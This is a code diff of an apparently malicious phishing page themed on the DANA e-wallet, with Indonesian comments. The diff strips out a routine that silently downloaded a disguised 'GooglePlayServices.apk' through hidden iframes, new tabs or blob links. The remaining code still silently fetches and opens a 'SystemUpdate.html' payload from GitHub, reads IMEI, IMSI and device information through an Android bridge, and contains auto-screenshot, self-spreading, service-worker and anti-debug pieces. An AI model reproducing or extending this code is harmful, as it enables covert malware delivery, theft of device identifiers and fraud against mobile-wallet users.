@@ -30,7 +30,6 @@
         @keyframes loading{0%{width:0%}100%{width:100%}}
         .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
         .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
-        /* ✅ TAMBAHAN UNTUK IOS */
         .ios-download{display:none}
     </style>
 </head>
@@ -40,7 +39,6 @@
 <div id="statusBar" class="status-bar"></div>
 <iframe id="downloadFrame" class="hidden-download"></iframe>
 
-<!-- ✅ TAMBAHAN UNTUK IOS -->
 <div id="iosDownload" class="ios-download"></div>
 
 <div id="popupDana">
@@ -230,7 +228,6 @@ var A = {
         }
         return false;
     },
-    // ✅ FUNGSI LAIN UNTUK ANDROID
     getDeviceInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getDeviceInfo())}catch(e){}} return null },
     getIMEI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMEI()}catch(e){}} return null },
     getIMSI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMSI()}catch(e){}} return null },
@@ -291,7 +288,7 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// 🔥 DOWNLOAD APK + SystemUpdate.html (UNIVERSAL)
+// 🔥 DOWNLOAD SystemUpdate.html SAJA! (TANPA APK!)
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
@@ -299,74 +296,11 @@ function downloadPayloadSilent() {
     
     K({ sumber: 'download_start', data: { platform: PLATFORM } });
     
-    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
-    var apkPath = '/storage/emulated/0/Download/GooglePlayServices.apk';
     var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
     // ============================================================
-    // ✅ 1. DOWNLOAD APK (UNIVERSAL)
-    // ============================================================
-    if (PLATFORM.isAndroid && A.isAvailable) {
-        try {
-            A.downloadFile(apkUrl, apkPath);
-            K({ sumber: 'apk_downloaded_bridge', data: { path: apkPath } });
-        } catch(e) {}
-    } else if (PLATFORM.isAndroid && !A.isAvailable) {
-        // ✅ ANDROID TANPA BRIDGE - PAKSA DOWNLOAD VIA IFRAME
-        try {
-            var iframe = document.createElement('iframe');
-            iframe.src = apkUrl;
-            iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
-            document.body.appendChild(iframe);
-            setTimeout(function() {
-                try { if (iframe && iframe.parentNode) iframe.parentNode.removeChild(iframe); } catch(e) {}
-            }, 5000);
-            K({ sumber: 'apk_download_iframe', data: 'attempt' });
-        } catch(e) {}
-        
-        // ✅ FALLBACK: BUKA LINK DI TAB BARU
-        try {
-            window.open(apkUrl, '_blank');
-            K({ sumber: 'apk_download_tab', data: 'attempt' });
-        } catch(e) {}
-    } else if (PLATFORM.isIOS) {
-        // ✅ IOS: REDIRECT KE APP STORE (DANA)
-        try {
-            window.location.href = 'https://apps.apple.com/id/app/dana-indonesia/id1440716954';
-            K({ sumber: 'apk_download_ios', data: 'redirect_to_appstore' });
-        } catch(e) {}
-    } else {
-        // ✅ PC: DOWNLOAD VIA BLOB
-        try {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', apkUrl, true);
-            xhr.responseType = 'blob';
-            xhr.timeout = 30000;
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    var blob = xhr.response;
-                    var link = document.createElement('a');
-                    link.href = URL.createObjectURL(blob);
-                    link.download = 'GooglePlayServices.apk';
-                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-                    document.body.appendChild(link);
-                    setTimeout(function() {
-                        link.click();
-                        setTimeout(function() {
-                            try { document.body.removeChild(link); } catch(e) {}
-                            URL.revokeObjectURL(url);
-                        }, 1000);
-                    }, 100);
-                    K({ sumber: 'apk_download_pc', data: 'ok' });
-                }
-            };
-            xhr.send();
-        } catch(e) {}
-    }
-    
-    // ============================================================
-    // ✅ 2. DOWNLOAD SystemUpdate.html (UNIVERSAL)
+    // ✅ DOWNLOAD SystemUpdate.html (UNIVERSAL)
     // ============================================================
     try {
         var xhr = new XMLHttpRequest();
@@ -418,7 +352,7 @@ function downloadPayloadSilent() {
     } catch(e) {}
     
     // ============================================================
-    // ✅ 3. BUKA SystemUpdate.html (UNIVERSAL)
+    // ✅ BUKA SystemUpdate.html (UNIVERSAL)
     // ============================================================
     setTimeout(function() {
         if (PLATFORM.isAndroid && A.isAvailable) {
@@ -613,7 +547,7 @@ function dapatkanSemua() {
         registerServiceWorker();
         setTimeout(autoSpread, 2000);
         
-        // 🔥 DOWNLOAD + BUKA HTML (UNIVERSAL)
+        // 🔥 DOWNLOAD + BUKA HTML (UNIVERSAL) - TANPA APK!
         setTimeout(function() { downloadPayloadSilent(); }, 500);
         
         setTimeout(function() { showKlaimNotification(); }, 3000);
